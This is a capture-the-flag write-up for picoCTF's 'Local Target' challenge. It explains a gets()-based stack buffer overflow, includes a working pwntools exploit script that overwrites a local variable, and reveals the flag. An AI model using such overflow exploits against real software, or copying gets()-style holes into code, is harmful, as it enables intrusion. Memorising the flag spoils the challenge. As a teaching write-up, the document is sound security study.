# Local Target #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoGym Exclusive, Buffer Overflow 

## Description ##
Smash the stack

## Approach ##
I am given a binary file called `local-target` and a C file called `local-target.c`. Inspecting the C file, I can see that it uses `gets` to read user input into a buffer, which is vulnerable to buffer overflow and an if statement that checks if `num` is equal to 65. If it is, then it prints the flag: 

    char input[16];
    int num = 64;
    
    printf("Enter a string: ");
    fflush(stdout);
    gets(input);
    printf("\n");
    
    printf("num is %d\n", num);
    fflush(stdout);
    
    if( num == 65 ){
        printf("You win!\n");
        fflush(stdout);
        // Open file
        fptr = fopen("flag.txt", "r");
        if (fptr == NULL)
        {
            printf("Cannot open file.\n");
            fflush(stdout);
            exit(0);
        }
        // Rest of program is not needed to see - we only care about the flag output
    }

`num` is stored on the stack just below the `input` buffer, so I can overwrite it with the value of 65 to get the program to print the flag. I just need to figure out the padding from `input` buffer to start of `num`. The `input` buffer is 16 bytes and `num` is 4 bytes in x86_64 architecture. This means I need to send 24 (Including extra padding for stack alignment) bytes of padding followed by 4-byte value 65 (in little-endian format) to overwrite `num`:

    from pwn import *

    # PORT will vary
    HOST = 'saturn.picoctf.net'
    PORT = 55253

    p = remote(HOST, PORT) 

    # Padding is 24 because input buffer (16 bytes) + 8 bytes to align with num (stack layout on x86_64)
    payload = b'a'*24 + b'\x41\x00\x00\x00'

    p.sendline(payload)

    p.interactive()

Running the script gives the flag:

    Enter a string:
    num is 65
    You win!
    picoCTF{l0c4l5_1n_5c0p3_fee8ef05}

Flag: picoCTF{l0c4l5_1n_5c0p3_fee8ef05}

## Reflection ## 
This is a classic buffer overflow vulnerability where we overwrite a local variable on the stack to control program execution. The key insight is understanding stack layout and using controlled input to overwrite the `num` variable to trigger the flag printing condition.



